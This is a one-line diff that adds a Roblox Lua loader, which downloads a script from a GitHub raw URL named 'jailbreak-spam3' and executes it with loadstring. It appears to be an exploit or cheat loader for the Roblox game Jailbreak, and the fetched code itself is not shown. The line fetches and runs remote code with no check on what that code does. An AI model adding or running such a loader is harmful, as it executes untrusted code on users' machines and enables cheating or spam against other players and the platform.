@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/jailbreak-spam3-ha84d5k4mb9rrh.lua"))()
